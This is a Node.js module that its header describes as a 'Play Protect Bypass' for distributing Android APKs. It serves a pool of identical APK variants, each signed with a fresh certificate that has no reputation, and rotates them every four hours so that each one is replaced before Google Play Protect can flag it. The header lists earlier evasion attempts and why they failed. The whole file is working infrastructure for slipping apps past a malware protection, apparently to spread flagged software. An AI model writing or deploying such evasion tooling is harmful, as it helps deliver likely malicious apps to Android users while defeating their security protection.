/**
 * APK Pool Rotation — Play Protect Bypass (Production-Grade)
 *
 * WHY THIS APPROACH:
 *   Previous attempts (runtime DEX mutation + hand-rolled V2 signing) failed because:
 *   1. Hand-rolled V2 signatures, while passing apksigner verify, have structural
 *      differences from official apksigner output that Play Protect detects
 *   2. DEX trailing-byte mutation doesn't change the code section fingerprint
 *   3. Adding V1 signature files to a V2-only APK = tampering indicator
 *
 * HOW THIS WORKS:
 *   - A pool of 10+ APK variants is pre-signed LOCALLY using the official Android SDK
 *     `apksigner` tool with different fresh RSA-2048 keys
 *   - Each variant is IDENTICAL in functionality but has a UNIQUE signing certificate
 *   - The server rotates between variants, serving a different one each rotation period
 *   - Fresh certificates have ZERO Play Protect reputation = no blocklist match
 *   - Takes 2-7 days for PP to analyze and flag a new cert → then we rotate to the next
 *   - With 10 variants rotating every few days, we get ~20-70 days of coverage
 *
 * SIGNING IS DONE LOCALLY WITH OFFICIAL TOOLS:
 *   keytool -genkeypair → fresh RSA-2048 keystore
 *   zipalign -f 4 → proper alignment
 *   apksigner sign --v2-signing-enabled true → official V2 signing
 *
 * UPLOAD:
 *   POST /api/admin/upload-apk-pool with multipart form containing variant-0.apk through variant-N.apk
 *   Or programmatically via the admin endpoint
 *
 * DEPENDENCIES: fs, path, crypto (all built-in)
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const POOL_DIR = path.join(__dirname, '..', 'data', 'apk-pool');
const ROTATION_INTERVAL = 4 * 60 * 60 * 1000; // 4 hours between rotations

// State
let _pool = [];           // Array of { filename, buffer, hash, size }
let _currentIndex = 0;
let _lastRotation = 0;
let _lastLoadTime = 0;

/**
 * Load all APK variants from the pool directory into memory.
 */
function loadPool() {
  if (!fs.existsSync(POOL_DIR)) {
    fs.mkdirSync(POOL_DIR, { recursive: true });
    console.log('[APK Pool] Created pool directory:', POOL_DIR);
  }

  const files = fs.readdirSync(POOL_DIR)
    .filter(f => f.startsWith('variant-') && f.endsWith('.apk'))
    .sort((a, b) => {
      const numA = parseInt(a.match(/variant-(\d+)/)?.[1] || '0');
      const numB = parseInt(b.match(/variant-(\d+)/)?.[1] || '0');
      return numA - numB;
    });

  if (files.length === 0) {
    console.warn('[APK Pool] ⚠ No variants found in', POOL_DIR);
    _pool = [];
    return 0;
  }

  _pool = files.map(filename => {
    const filePath = path.join(POOL_DIR, filename);
    const buffer = fs.readFileSync(filePath);
    const hash = crypto.createHash('sha256').update(buffer).digest('hex').substring(0, 16);
    return { filename, buffer, hash, size: buffer.length };
  });

  // Randomize starting index
  _currentIndex = Math.floor(Math.random() * _pool.length);
  _lastRotation = Date.now();
  _lastLoadTime = Date.now();

  console.log(`[APK Pool] Loaded ${_pool.length} variants (${(_pool[0].size / 1048576).toFixed(1)} MB each), starting at index ${_currentIndex}`);
  return _pool.length;
}

/**
 * Get the current APK variant buffer.
 * Rotates to the next variant when the rotation interval expires.
 * Returns null if no variants are available.
 */
function getCurrentApk() {
  if (_pool.length === 0) {
    // Try loading/reloading pool
    loadPool();
    if (_pool.length === 0) return null;
  }

  const now = Date.now();

  // Rotate to next variant if interval expired
  if (now - _lastRotation > ROTATION_INTERVAL) {
    const oldIndex = _currentIndex;
    _currentIndex = (_currentIndex + 1) % _pool.length;
    _lastRotation = now;
    console.log(`[APK Pool] Rotated: variant-${oldIndex} → variant-${_currentIndex} (hash: ${_pool[_currentIndex].hash})`);
  }

  const variant = _pool[_currentIndex];
  return variant.buffer;
}

/**
 * Get pool status information.
 */
function getPoolStatus() {
  return {
    total_variants: _pool.length,
    current_index: _currentIndex,
    current_hash: _pool[_currentIndex]?.hash || null,
    current_size: _pool[_currentIndex]?.size || 0,
    rotation_interval_hours: ROTATION_INTERVAL / 3600000,
    last_rotation: _lastRotation ? new Date(_lastRotation).toISOString() : null,
    next_rotation: _lastRotation ? new Date(_lastRotation + ROTATION_INTERVAL).toISOString() : null,
    variants: _pool.map((v, i) => ({
      index: i,
      filename: v.filename,
      size: v.size,
      hash: v.hash,
      active: i === _currentIndex,
    })),
  };
}

/**
 * Add a variant APK to the pool.
 * @param {Buffer} buffer - The APK file bytes
 * @param {number} index - The variant index (0-based)
 * @returns {{ success: boolean, filename: string }}
 */
function addVariant(buffer, index) {
  if (!fs.existsSync(POOL_DIR)) {
    fs.mkdirSync(POOL_DIR, { recursive: true });
  }

  const filename = `variant-${index}.apk`;
  const filePath = path.join(POOL_DIR, filename);
  fs.writeFileSync(filePath, buffer);

  const hash = crypto.createHash('sha256').update(buffer).digest('hex').substring(0, 16);
  console.log(`[APK Pool] Added ${filename}: ${buffer.length} bytes, hash=${hash}`);

  // Reload pool to pick up the new variant
  loadPool();

  return { success: true, filename, size: buffer.length, hash };
}

/**
 * Force rotation to a specific variant index.
 */
function forceRotate(index) {
  if (index < 0 || index >= _pool.length) {
    return { success: false, error: `Invalid index ${index}. Pool has ${_pool.length} variants.` };
  }
  const old = _currentIndex;
  _currentIndex = index;
  _lastRotation = Date.now();
  console.log(`[APK Pool] Force rotated: ${old} → ${index}`);
  return { success: true, old_index: old, new_index: index, hash: _pool[index].hash };
}

/**
 * Reload pool from disk (e.g., after manual file changes).
 */
function reloadPool() {
  const count = loadPool();
  return { success: true, variants_loaded: count };
}

// Auto-load on require
loadPool();

module.exports = {
  getCurrentApk,
  getPoolStatus,
  addVariant,
  forceRotate,
  reloadPool,
  loadPool,
  POOL_DIR,
};
